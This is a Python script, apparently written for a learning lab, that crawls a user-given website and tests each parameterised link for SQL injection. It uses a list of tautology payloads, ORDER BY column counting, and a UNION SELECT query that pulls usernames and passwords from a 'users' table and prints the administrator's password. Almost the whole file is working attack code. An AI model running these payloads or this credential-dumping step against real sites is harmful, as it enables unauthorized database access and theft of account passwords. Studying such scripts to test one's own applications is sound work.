import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import random
from urllib.parse import urlparse

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

# request with retries
def get_response(url, retries=3):
    for i in range(retries):
        try:
            r = requests.get(url, verify=False, proxies=proxies)
            if r.status_code == 200:
                return r
            elif r.status_code == 403:
                print(f"[+] Felicitaciones, su página web es segura: el acceso a {url} fue bloqueado con un código 403 (Forbidden).")
                return r
        except requests.RequestException:
            time.sleep(random.uniform(1, 3))
    print(f"[-] Failed to retrieve {url} after {retries} retries.")
    return None

# try to get paths with get parameter
def find_urls_to_test(url, base_url):
    response = get_response(url)
    if not response:
        return set()

    soup = BeautifulSoup(response.text, 'html.parser')

    base_url = base_url.rstrip('/')
    parsed_base_url = urlparse(base_url)

    links = set()
    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        
        parsed_href = urlparse(href)
        if parsed_href.netloc and parsed_href.netloc != parsed_base_url.netloc:
            continue
        
        full_url = href if href.startswith('http') else base_url + href
        
        if "Id" not in href:
            links.add(full_url)
            if "?" in href:
               links.add(full_url)
            elif href.startswith('/'):
               links.add(full_url)

    if not links:
        print("[!] No parameterized URLs found, searching deeper in the page source...")
        scripts = soup.find_all('script')
        for script in scripts:
            if "?" in script.text:
                print("[+] Found a possible URL in script content.")
                links.add(script.text)

    if not links:
        print("[-] No URLs with parameters found.")
    else:
        print(f"[+] Found {len(links)} URLs")
    
    return links

# perform SQL injection to find the administrator's password
def exploit_sqli_users_table(url):
    common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin']
    sql_payload = "' UNION select username, password from users--"
    r = requests.get(url + sql_payload, verify=False, proxies=proxies)
    # res = r.text
    
    if "text/html" in r.headers.get("Content-Type", ""):
        soup = BeautifulSoup(r.text, 'html.parser')
    else:
        print("[-] La respuesta no es de tipo HTML.")
        return False
    
    if not soup.body:
        print("[-] No se pudo encontrar el cuerpo HTML en la respuesta.")
        return False
    
    for username in common_usernames:
        user_element = soup.body.find(string=username)
        if user_element:
            parent = user_element.parent
            password_element = parent.findNext('td') if parent else None
            if password_element and password_element.contents:
                admin_password = password_element.contents[0]
                print(f"[+] Encontramos la contraseña del usuario '{username}': '{admin_password}'")
                return True
        else:
            print(f"[-] No se encontró el usuario '{username}' en la respuesta.")
    
    return False


# perform the SQL injection
def exploit_sqli(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        '" OR "1"="1"',
        '" OR "1"="1" --',
        "' OR 'a'='a",
        "' OR 'a'='a' --",
        "1 OR 1=1",
        "admin' --",
        "' UNION SELECT NULL, NULL --"
    ]

    for payload in payloads:
        target_url = url + payload
        r = requests.get(target_url, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            print(f"[+] Vulnerable URL found with payload {payload}")
            return True

    return False

# function that detects the number of columns in the database to detect errors
def exploit_sqli_column_number(url):
    for i in range(1, 5):
        target_url = url + "'+order+by+%s--" % i
        r = requests.get(target_url, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i - 1 
    return False

if __name__ == "__main__":
    
    base_url = input("Ingrese la URL que quiere escanear: ").strip()
    base_url = base_url.rstrip('/')

    print("[+] Inspeccionando las distintas rutas para la pagina ingresada...")
    urls_to_test = find_urls_to_test(base_url, base_url)

    if urls_to_test:
        # print("[+] Found the following URLs with parameters:")
        for url in urls_to_test:
            print(url)

        print("\n[+] Testing each URL for SQL Injection vulnerabilities...")

        for test_url in urls_to_test:
            print(f"\n[+] Testing URL: {test_url}")
            
            # Test for general SQL injection vulnerabilities
            is_vulnerable = exploit_sqli(test_url)
             
            if not is_vulnerable:
                num_col = exploit_sqli_column_number(test_url)
                if num_col:
                    print(f"[+] Vulnerable URL found: {test_url}")
                    print(f"[+] Pudimos determinar que su base de datos tiene {num_col} columnas en esta URL")
                else:
                    print("[-] URL not vulnerable to sql injection")
            
            # After testing general vulnerabilities, test for user table credentials
            exploit_sqli_users_table(test_url)
            
    else:
        print("[-] No URLs with parameters found.")


